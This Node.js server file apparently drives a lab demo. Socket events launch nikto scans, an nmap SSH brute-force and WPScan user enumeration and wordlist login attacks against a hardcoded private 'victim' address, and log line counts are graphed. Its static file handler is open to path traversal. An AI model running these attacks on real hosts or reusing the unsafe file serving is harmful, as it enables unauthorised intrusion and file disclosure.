var fs = require("fs");
var http = require("http");
var exec = require('child_process').exec;

// var server = http.createServer(function (req, res){
//     var url = "public" + req.url;
//     if (fs.existsSync(url)){
//         fs.readFile(url,(err,data) => {
//             if(!err){
//                 res.writeHead(200, {"Content-Type": getType(url)});
//                 res.end(data);
//             }
//         });
//     }
// });

var port = process.env.PORT || 5000;
var server = http.createServer(function(req, res) {
    var url = "public" + req.url;
    if (fs.existsSync(url)){
        fs.readFile(url,(err,data) => {
            if(!err){
                res.writeHead(200, {"Content-Type": getType(url)});
                res.end(data);
            }
        });
    }
}).listen(port, function() {
    console.log("Start browser: http://localhost:" + port);
});;

var io = require("socket.io").listen(server);
const log1 = "./log/access.log";
const log2 = "./log/secure.log";
var sum_aclog = 0;
var sum_sclog = 0;

var obj = {
    ac_cnt : 0,
    sc_cnt : 0,
};
exec("wc -l " + log1 +"| awk '{print $1}'", (err, stdout, stderr) => {
    if (err) { 
        console.log("err" +err); 
    }
    if (stderr) {
        console.log("stderr" + stderr);
    }
    obj.ac_cnt = stdout - sum_aclog;
    sum_aclog = stdout;
});

exec("wc -l " + log2 +"| awk '{print $1}'", (err, stdout, stderr) => {
    if (err) { 
        console.log("err" +err); 
    }
    if (stderr) {
        console.log("stderr" + stderr);
    }
    obj.ac_cnt = stdout - sum_aclog;
    sum_sclog = stdout;
});

io.sockets.on("connection", function(socket){
    console.log("io.socket clear!");

    // log update
    socket.on("log check", function(){
        log_check();
        io.sockets.emit("graph update",obj);
    })
    // setInterval(() => {
    //     exec("wc -l " + log1 +"| awk '{print $1}'", (err, stdout, stderr) => {
    //         if (err) { 
    //             console.log("err" +err); 
    //         }
    //         if (stderr) {
    //             console.log("stderr" + stderr);
    //         }
    //         obj.ac_cnt = stdout - sum_aclog;
    //         sum_aclog = stdout;
    //     });
    //     exec("wc -l " + log2 +"| awk '{print $1}'", (err, stdout, stderr) => {
    //         if (err) { 
    //             console.log("err" +err); 
    //         }
    //         if (stderr) {
    //             console.log("stderr" + stderr);
    //         }
    //         obj.sc_cnt = stdout -sum_sclog;
    //         sum_sclog = stdout;
    //     });
    //     // クライアント側に送るためのfunction
    //     //console.log("access2:" + obj.ac_cnt);
    //     //console.log("secure2:" + obj.sc_cnt);
    //     io.sockets.emit("graph update", obj);
    // }, 10000);
    
    // web shell
    socket.on("exploit", function(cmd){
        //console.log(cmd);
        // nikto service scan
        if (cmd == 'nikto'){
            response("nikto -h victim_machine -port 80");
            exec("nikto -h 10.37.129.8 -port 80", (err, stdout, stderr) => {
                if (err) { 
                    console.log("err" +err); 
                }
                if (stderr) {
                    console.log("stderr" + stderr);
                }
            });
            //response("service scan end");
        }
        // ssh brute force attack via nmap
        if (cmd == "ssh brute force attack"){
            response("nmap -p 22 --script ssh-brute");
            exec("nmap -p 22 --script ssh-brute --script-args ssh-brute.timeout=4s --script-args unpwdb.timelimit=1m 10.37.129.8", (err, stdout, stderr) => {
                if (err) { 
                    console.log("err" +err); 
                }
                if (stderr) {
                    console.log("stderr" + stderr);
                }
            });
            //response("bruteforce end");
        }
        // wordpress user scan via WPscan
        if (cmd == "wpscan user"){
            response("wpscan --url http://ipaddr -e u");
            exec("wpscan --url http://10.37.129.8 -e u", (err, stdout, stderr) => {
                if (err) { 
                    console.log("err" +err); 
                }
                if (stderr) {
                    console.log("stderr" + stderr);
                }
            });
            //response("bruteforce end");
        }
        // wordpress login attack via WPscan
        if (cmd == "wpscan login"){
            response("wpscan --url http://ipaddr --wordlist wordlist.txt --threads 10 --username usrname");
            exec("wpscan --url http://10.37.129.8 --wordlist shellscript/lower.txt --threads 10 --username banban", (err, stdout, stderr) => {
                if (err) { 
                    console.log("err" +err); 
                }
                if (stderr) {
                    console.log("stderr" + stderr);
                }
            });
            //response("bruteforce end");
        }
    });

    function response(msg){
        io.sockets.emit("cmd start", msg);
    }

    function log_check(){
        exec("wc -l " + log1 +"| awk '{print $1}'", (err, stdout, stderr) => {
            if (err) { 
                console.log("err" +err); 
            }
            if (stderr) {
                console.log("stderr" + stderr);
            }
            obj.ac_cnt = stdout - sum_aclog;
            sum_aclog = stdout;
        });
        exec("wc -l " + log2 +"| awk '{print $1}'", (err, stdout, stderr) => {
            if (err) { 
                console.log("err" +err); 
            }
            if (stderr) {
                console.log("stderr" + stderr);
            }
            obj.sc_cnt = stdout -sum_sclog;
            sum_sclog = stdout;
        });
    }

});

// var port = process.env.PORT || 5000;
// server.listen(port, function() {
//     console.log("Start browser: http://localhost:" + port);
// });



function getType(_url) {
    var types = {
        "html": "text/html",
        "css": "text/css",
        "js": "text/javascript",
        "png": "image/png",
        "gif": "image/gif",
        ".svg": "svg+xml",
    }
    for (var key in types) {
        if (_url.endsWith(key)) {
            return types[key];
        }
    }
    return "text/plain";
}